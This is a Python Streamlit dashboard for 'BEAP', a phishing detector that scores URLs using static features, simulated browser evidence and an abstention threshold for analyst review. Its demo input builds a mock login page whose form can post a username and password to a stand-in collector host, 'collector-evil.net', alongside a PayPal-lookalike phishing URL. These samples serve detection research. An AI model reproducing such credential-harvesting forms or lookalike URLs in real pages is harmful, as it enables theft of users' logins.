"""
BEAP Interactive Web Dashboard.
Built with Streamlit.
Run locally via:
  streamlit run demo/app.py
"""

import os
import sys
import pandas as pd
import numpy as np
import streamlit as st

# Add workspace to sys.path
sys.path.insert(0, os.path.abspath("."))

from beap.config import DEFAULT_TAU_LOW, DEFAULT_TAU_HIGH
from beap.detector import BEAPDetector
from beap.models import BEAPLogisticRegression, BEAPXGBoost

st.set_page_config(
    page_title="BEAP: Explainable Phishing Detection",
    page_icon="🛡️",
    layout="wide"
)


@st.cache_resource
def load_trained_detector(model_type: str = "lr", feature_mode: str = "multimodal_full"):
    train_df = pd.read_csv(os.path.join("data", "processed", "train.csv"))
    if model_type == "xgb":
        clf = BEAPXGBoost(n_estimators=80, max_depth=4)
    else:
        clf = BEAPLogisticRegression(C=1.0)

    det = BEAPDetector(classifier=clf, feature_mode=feature_mode, use_memory=True)
    det.fit(train_df, train_df["label"].values.astype(int))
    return det


def main():
    st.title("🛡️ BEAP: Explainable Phishing Detection with Browser Evidence & Abstention")
    st.markdown(
        """
        **BEAP** augments static URL/HTML inspection with **dynamic browser-level evidence**
        (HTTP security headers, SSL certificate posture, and cross-domain form behaviors),
        backed by a **selective abstention policy** for human-in-the-loop uncertainty handling.
        """
    )

    # Sidebar controls
    st.sidebar.header("⚙️ Detector Configuration")

    model_choice = st.sidebar.selectbox("Classifier Family", ["Logistic Regression (Linear Log-Odds)", "XGBoost (TreeSHAP)"])
    model_type = "xgb" if "XGBoost" in model_choice else "lr"

    modality_choice = st.sidebar.selectbox(
        "Feature Modality",
        ["Full BEAP Multimodal (Static + Browser)", "Static URL + HTML Only", "Dynamic Browser Only"]
    )
    if "Static" in modality_choice:
        feat_mode = "static_all"
    elif "Browser Only" in modality_choice:
        feat_mode = "dynamic_only"
    else:
        feat_mode = "multimodal_full"

    st.sidebar.subheader("Selective Abstention Thresholds")
    delta = st.sidebar.slider(
        "Uncertainty Margin (delta)",
        min_value=0.00,
        max_value=0.45,
        value=0.15,
        step=0.01,
        help="Scores within [0.5 - delta, 0.5 + delta] are flagged as UNCERTAIN (abstained) for manual SOC review."
    )
    tau_low = 0.5 - delta
    tau_high = 0.5 + delta
    st.sidebar.info(f"Legitimate Threshold: <= {tau_low:.2f}\nPhishing Threshold: >= {tau_high:.2f}")

    detector = load_trained_detector(model_type=model_type, feature_mode=feat_mode)
    detector.abstention_engine.tau_low = tau_low
    detector.abstention_engine.tau_high = tau_high

    # URL input section
    st.subheader("🔍 Inspect Webpage")

    preset_col1, preset_col2, preset_col3 = st.columns(3)
    preset_url = ""
    if preset_col1.button("🚨 Evasive Brand Phishing"):
        preset_url = "https://auth-verification-paypal-notice.xyz/account/login"
    if preset_col2.button("✅ Legitimate Banking Portal"):
        preset_url = "https://portal.chase.com/auth/login?verify=true"
    if preset_col3.button("⚠️ Borderline / Ambiguous Page"):
        preset_url = "https://my-unregistered-hobby-site.org/user/portal"

    url_input = st.text_input("Target URL", value=preset_url or "https://auth-verification-paypal-notice.xyz/account/login")

    # Mock dynamic evidence inputs for demonstration
    with st.expander("🛠️ Advanced Browser Evidence Configuration (Simulated Runtime State)", expanded=False):
        col_h1, col_h2, col_h3 = st.columns(3)
        hsts_checked = col_h1.checkbox("Strict-Transport-Security (HSTS)", value="chase.com" in url_input)
        csp_checked = col_h2.checkbox("Content-Security-Policy (CSP)", value="chase.com" in url_input)
        xfo_checked = col_h3.checkbox("X-Frame-Options (DENY/SAMEORIGIN)", value="chase.com" in url_input)

        col_b1, col_b2, col_b3 = st.columns(3)
        cross_form = col_b1.checkbox("Form Submits to Cross-Domain Endpoint", value=".xyz" in url_input)
        short_cert = col_b2.checkbox("Short-lived / Free Disposable Cert (<90 days)", value=".xyz" in url_input)
        reflection = col_b3.checkbox("Script Probe Reflected Unsanitized", value=".xyz" in url_input)

    headers = {}
    if hsts_checked:
        headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains; preload"
    if csp_checked:
        headers["Content-Security-Policy"] = "default-src 'self'; form-action 'self';"
    if xfo_checked:
        headers["X-Frame-Options"] = "DENY"
    headers["X-Content-Type-Options"] = "nosniff"

    tls_info = {
        "cert_valid": True,
        "longevity_days": 45.0 if short_cert else 365.0,
        "issuer_name": "Let's Encrypt Authority X3" if short_cert else "DigiCert Global Root"
    }

    form_action = "https://collector-evil.net/post" if cross_form else "/auth/login_submit"
    html_content = f"""
    <html><head><title>Authentication Verification</title></head>
    <body><form action="{form_action}" method="POST">
    <input type="text" name="user" /><input type="password" name="password" />
    <button type="submit">Submit</button></form>
    {'<!--beap_xss_probe_918273-->' if reflection else ''}
    </body></html>
    """

    if st.button("🚀 Analyze Webpage with BEAP", type="primary"):
        pred, rep = detector.inspect_url(
            url=url_input,
            html_content=html_content,
            headers=headers,
            tls_info=tls_info
        )

        st.markdown("---")

        # Top verdict banner
        res_col1, res_col2 = st.columns([1, 2])

        with res_col1:
            st.metric(label="Phishing Probability", value=f"{rep.phishing_probability:.1%}")

            if rep.verdict == "PHISHING":
                st.error("### 🚨 VERDICT: PHISHING")
            elif rep.verdict == "LEGITIMATE":
                st.success("### ✅ VERDICT: LEGITIMATE")
            else:
                st.warning("### ⚠️ VERDICT: UNCERTAIN (ABSTAIN)")
                st.info(f"**Abstention Reason:**\n{rep.abstention_reason}")

            st.caption(f"**Recommended SOC Action:**\n{rep.action_recommendation}")

        with res_col2:
            st.subheader("Diagnostic Evidence Breakdown")
            tab_signals, tab_headers, tab_metrics = st.tabs(["📊 Explainable Signals", "🌐 Browser Evidence", "📈 Abstention Curve"])

            with tab_signals:
                st.write("**Top Risk Signals (Driving toward Phishing):**")
                if rep.top_risk_signals:
                    for s in rep.top_risk_signals:
                        st.markdown(f"- 🔴 **{s.feature_name}** (`{s.attribution_weight:+.3f}`): {s.explanation}")
                else:
                    st.write("None")

                st.write("**Top Trust Signals (Driving toward Legitimate):**")
                if rep.top_trust_signals:
                    for s in rep.top_trust_signals:
                        st.markdown(f"- 🟢 **{s.feature_name}** (`{s.attribution_weight:+.3f}`): {s.explanation}")
                else:
                    st.write("None")

            with tab_headers:
                st.write("#### Dynamic Browser Security Posture:")
                h_col1, h_col2 = st.columns(2)
                h_col1.markdown(f"- **HSTS Enforced:** {'✅ Yes' if hsts_checked else '❌ Missing'}")
                h_col1.markdown(f"- **Content-Security-Policy:** {'✅ Active' if csp_checked else '❌ Missing'}")
                h_col1.markdown(f"- **Clickjacking Protection (XFO):** {'✅ Active' if xfo_checked else '❌ Missing'}")
                h_col2.markdown(f"- **Form Exfiltration:** {'❌ Cross-Domain Collector' if cross_form else '✅ First-Party / Verified'}")
                h_col2.markdown(f"- **TLS Longevity:** {'⚠️ Short-Lived Burner' if short_cert else '✅ Enterprise Validated'}")
                h_col2.markdown(f"- **Reflected Script Echo:** {'❌ Vulnerability Detected' if reflection else '✅ Sanitized'}")

            with tab_metrics:
                st.write("#### Rejection-Accuracy Profile:")
                fig_path = os.path.join("results", "figures", "rejection_accuracy_curve.png")
                if os.path.exists(fig_path):
                    st.image(fig_path, caption="Coverage vs. Selective Accuracy Curve")
                else:
                    st.info("Run experiments/run_abstention_eval.py to view curve.")


if __name__ == "__main__":
    main()

